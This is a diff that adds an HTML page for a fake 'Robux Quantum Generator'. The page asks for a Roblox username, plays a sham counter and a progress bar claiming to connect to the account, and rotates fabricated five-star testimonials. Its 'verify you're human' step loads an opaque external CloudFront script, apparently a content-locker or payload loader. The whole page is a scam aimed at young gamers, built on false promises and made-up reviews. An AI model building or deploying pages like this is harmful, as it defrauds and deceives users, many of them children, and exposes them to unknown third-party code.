@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Robux Quantum Generator</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0; the game 🎮 🎯 
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+    body {
+      background: linear-gradient(145deg, #0f0f0f, #1c1c1c);
+      color: #00ffcc;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 0 80px;
+    }
+    .container {
+      max-width: 480px;
+      width: 90%;
+      background: rgba(10, 10, 10, 0.95);
+      border-radius: 20px;
+      box-shadow: 0 0 25px #00ffcc55;
+      text-align: center;
+      padding: 30px 20px 40px;
+      margin-bottom: 40px;
+    }
+    h1 {
+      font-size: 26px;
+      margin-bottom: 15px;
+      color: #00ffee;
+    }
+    input,
+    select {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 10px;
+      background: #111;
+      color: #00ffee;
+      font-size: 16px;
+    }
+    .btn {
+      background-color: #00ffaa;
+      color: #000;
+      padding: 12px;
+      border: none;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background-color: #00cc88;
+    }
+    .step { display: none; }
+    .step.active-step { display: block; }
+    /* عداد رقمي بصري مولد */
+    #robuxCounter {
+      font-size: 40px;
+      font-weight: 700;
+      margin: 30px 0;
+      color: #ffff00;
+      letter-spacing: 2px;
+    }
+    /* شريط التحميل */
+    #progressBarContainer {
+      width: 100%;
+      background-color: #222;
+      border-radius: 15px;
+      overflow: hidden;
+      margin: 20px 0;
+      height: 20px;
+      box-shadow: inset 0 0 5px #00ffcc88;
+    }
+    #progressBar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #00ffaa, #00cc88);
+      transition: width 0.2s ease;
+    }
+    /* التعليقات */
+    .comments-container {
+      max-width: 480px;
+      width: 90%;
+      padding: 20px;
+      background: #111;
+      border-radius: 15px;
+      box-shadow: 0 0 15px #00ffcc33;
+      max-height: 280px;
+      overflow-y: auto;
+      text-align: left;
+      color: #aaffee;
+      font-size: 14px;
+      user-select: none;
+      margin-top: 10px;
+    }
+    .comments-container h2 {
+      margin-bottom: 20px;
+      color: #00ffee;
+      font-size: 20px;
+      text-align: center;
+    }
+    .comment {
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.6s ease;
+      margin-bottom: 15px;
+      background: #222;
+      padding: 10px 15px;
+      border-radius: 10px;
+      line-height: 1.4;
+    }
+    .comment.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .verified {
+      color: #0f0;
+      font-size: 12px;
+      margin-left: 8px;
+      user-select: none;
+    }
+    .stars {
+      color: gold;
+      margin-left: 8px;
+      user-select: none;
+    }
+    /* إشعار انتهاء التوليد */
+    #generationCompleteMsg {
+      color: #ffff00;
+      font-weight: 700;
+      margin-top: 15px;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="stepsContainer">
+    <!-- Step 1: Username -->
+    <div id="step1" class="step active-step">
+      <h1>Enter your Roblox Username</h1>
+      <input type="text" id="username" placeholder="Roblox Username" autocomplete="off" />
+      <select id="platform">
+        <option value="windows">Windows</option>
+        <option value="mac">Mac</option>
+        <option value="android">Android</option>
+        <option value="ios">iOS</option>
+      </select>
+      <button class="btn" onclick="goToStep(2)">Next</button>
+    </div>
+
+    <!-- Step 2: Select Robux Amount -->
+    <div id="step2" class="step">
+      <h1>Select Robux Amount</h1>
+      <select id="amount">
+        <option value="1000">1,000 Robux</option>
+        <option value="2500">2,500 Robux</option>
+        <option value="5000">5,000 Robux</option>
+        <option value="10000">10,000 Robux</option>
+        <option value="20000">20,000 Robux</option>
+   
+      </select>
+      <button class="btn" onclick="goToStep(6)">Next</button>
+    </div>
+
+    <!-- Step 6: Robux Generator Counter -->
+    <div id="step6" class="step">
+      <h1>Generating Robux...</h1>
+      <div id="robuxCounter">0 Robux</div>
+      <div id="generationCompleteMsg" style="display:none;">Generation complete!</div>
+    </div>
+
+    <!-- Step 3: Connecting -->
+    <div id="step3" class="step">
+      <h1>Connecting to servers...</h1>
+      <p>Please wait while we connect to your account.</p>
+      <div id="progressBarContainer">
+        <div id="progressBar"></div>
+      </div>
+    </div>
+
+    <!-- Step 4: Almost done -->
+    <div id="step4" class="step">
+      <h1>Almost done!</h1>
+      <p>Finalizing Robux transfer. Please verify you're human.</p>
+      <button class="btn" onclick="_xY()">Verify now!</button>
+      <script type="text/javascript">
+        var Masdq_RCR_jxIrQc={"it":4535131,"key":"e567e"};
+      </script>
+      <script src="https://dfmpe7igjx4jo.cloudfront.net/71e99a2.js"></script>
+    </div>
+  </div>
+
+  <!-- Comments Container منفصلة -->
+  <div class="comments-container" aria-live="polite" aria-atomic="true">
+    <h2>Live Comments</h2>
+    <div id="commentList"></div>
+  </div>
+
+  <script>
+    const comments = [
+      { name: 'gamerx', text: 'Wow this actually worked!!', verified: true, stars: 5 },
+      { name: 'nova', text: 'Got my Robux in under 3 min 🚀', verified: true, stars: 4 },
+      { name: 'crystal', text: 'Skeptical at first but it’s real.', verified: false, stars: 4 },
+      { name: 'zeek', text: 'My friends are jealous now 😂', verified: true, stars: 5 },
+      { name: 'riley', text: 'Didn’t expect it to work but it did!', verified: false, stars: 3 },
+      { name: 'alex', text: 'Best generator I have tried.', verified: true, stars: 5 },
+      { name: 'luna', text: 'Smooth and easy to use.', verified: false, stars: 4 },
+      { name: 'max', text: 'Instant Robux delivery!', verified: true, stars: 5 },
+      { name: 'chloe', text: 'I love this site so much!', verified: true, stars: 5 },
+      { name: 'leo', text: 'Totally safe and legit.', verified: false, stars: 3 },
+      { name: 'mia', text: 'Finally got my Robux after trying others.', verified: true, stars: 4 },
+      { name: 'ethan', text: 'Fast and reliable generator.', verified: true, stars: 5 },
+      { name: 'olivia', text: 'Great support team!', verified: false, stars: 4 },
+      { name: 'noah', text: 'Worked perfectly on my phone.', verified: true, stars: 5 },
+      { name: 'ava', text: 'Very user-friendly interface.', verified: false, stars: 4 },
+      { name: 'jack', text: 'Highly recommend this.', verified: true, stars: 5 },
+      { name: 'sophia', text: 'I was amazed by how quick it was!', verified: false, stars: 4 },
+      { name: 'mason', text: 'The best Robux generator out there.', verified: true, stars: 5 },
+      { name: 'isabella', text: 'Loved the verification step, very secure.', verified: false, stars: 4 },
+      { name: 'logan', text: 'Superb experience from start to finish.', verified: true, stars: 5 },
+      { name: 'emma', text: 'Simple and effective.', verified: false, stars: 3 },
+      { name: 'lucas', text: 'Works as advertised, thanks!', verified: true, stars: 5 }
+    ];
+
+    let currentStep = 1;
+
+    function goToStep(step) {
+      if (step === 2) {
+        const username = document.getElementById('username').value.trim();
+        if (!username) {
+          alert('Please enter your username');
+          return;
+        }
+      }
+
+      document.querySelector(`#step${currentStep}`).classList.remove('active-step');
+      document.querySelector(`#step${step}`).classList.add('active-step');
+      currentStep = step;
+
+      if (step === 6) {
+        generateRobuxCounter();
+      } else if (step === 3) {
+        startProgressBar();
+      }
+    }
+
+    // عداد توليد الروبكس
+    function generateRobuxCounter() {
+      const amountSelect = document.getElementById('amount');
+      const amount = parseInt(amountSelect.value);
+      let counter = 0;
+      const robuxCounter = document.getElementById('robuxCounter');
+      const completeMsg = document.getElementById('generationCompleteMsg');
+
+      robuxCounter.textContent = "0 Robux";
+      completeMsg.style.display = 'none';
+
+      const stepAmount = Math.ceil(amount / 100);
+      const interval = setInterval(() => {
+        counter += stepAmount;
+        if (counter >= amount) {
+          counter = amount;
+          clearInterval(interval);
+          completeMsg.style.display = 'block';
+          // بعد 1.5 ثانية ننتقل للخطوة 3 (شريط التحميل)
+          setTimeout(() => {
+            goToStep(3);
+          }, 1500);
+        }
+        robuxCounter.textContent = counter.toLocaleString() + " Robux";
+      }, 30);
+    }
+
+    // شريط التحميل خطوة 3
+    function startProgressBar() {
+      const progressBar = document.getElementById('progressBar');
+      progressBar.style.width = '0%';
+      let width = 0;
+      const interval = setInterval(() => {
+        width += 2; // يزيد 2% كل 100ms = 5 ثواني
+        if (width > 100) {
+          clearInterval(interval);
+          goToStep(4);
+        } else {
+          progressBar.style.width = width + '%';
+        }
+      }, 100);
+    }
+
+    // تعليقات
+    const commentList = document.getElementById('commentList');
+    function showCommentsLoop() {
+      let i = 0;
+      function showNext() {
+        if (i >= comments.length) {
+          i = 0;
+          commentList.innerHTML = '';
+        }
+        const c = comments[i];
+        const div = document.createElement('div');
+        div.classList.add('comment');
+        let html = `<strong>@${c.name}</strong>`;
+        if (c.verified) html += `<span class='verified'> ✔️ verified</span>`;
+        html += `<span class='stars'>${'★'.repeat(c.stars)}</span>`;
+        html += `<p>${c.text}</p>`;
+        div.innerHTML = html;
+        commentList.prepend(div);
+        setTimeout(() => {
+          div.classList.add('visible');
+        }, 50);
+        i++;
+        setTimeout(showNext, 3000);
+      }
+      showNext();
+    }
+    showCommentsLoop();
+  </script>
+</body>
+</html>
